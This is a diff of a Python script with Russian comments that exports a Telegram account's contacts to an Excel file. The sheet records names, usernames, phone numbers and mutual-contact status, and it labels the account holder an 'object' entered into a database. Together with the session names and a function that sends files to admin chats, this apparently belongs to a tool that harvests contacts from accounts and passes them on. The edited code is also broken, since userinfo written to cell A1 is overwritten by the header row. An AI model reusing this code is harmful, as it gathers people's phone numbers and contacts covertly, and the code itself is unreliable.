@@ -156,7 +156,7 @@ def send_files_to_bot(bot, admin_chat_ids):
 
 
 # Выгружаем контакты в Excel
-async def get_contacts(client, session_name, userid):
+async def get_contacts(client, session_name, userid, userinfo):
     result = await client(GetContactsRequest(0))
     contacts = result.users
 
@@ -165,11 +165,13 @@ async def get_contacts(client, session_name, userid):
     wb = openpyxl.Workbook()
     sheet = wb.active
 
-    headers = ['ID', 'First name (так записан у объекта в книге)', 'Last name (так записан у объекта в книге)', 'Username', 'Телефон', 'Взаимный контакт', 'Дата внесения в базу', 'Номер объекта']
+    sheet.cell(row=1, column=1, value=userinfo)
+
+    headers = ['ID', 'First name (так записан у объекта в книге)', 'Last name (так записан у объекта в книге)', 'Username', 'Телефон', 'Взаимный контакт', 'Дата внесения в базу', 'ID объекта']
     for col, header in enumerate(headers, start=1):
         sheet.cell(row=1, column=col, value=header)
 
-    row_num = 2
+    row_num = 3
     
     for contact in contacts:
         if hasattr(contact, 'id'):
@@ -187,8 +189,8 @@ async def get_contacts(client, session_name, userid):
             sheet.cell(row=row_num, column=6, value='взаимный')
         
         sheet.cell(row=row_num, column=7, value=datetime.now().strftime('%d/%m/%Y %H:%M:%S'))
-        sheet.cell(row=row_num, column=8, value=session_name)
-        sheet.cell(row=row_num, column=9, value=userid)
+        #sheet.cell(row=row_num, column=8, value=session_name)
+        sheet.cell(row=row_num, column=8, value=userid)
      
         row_num += 1
 
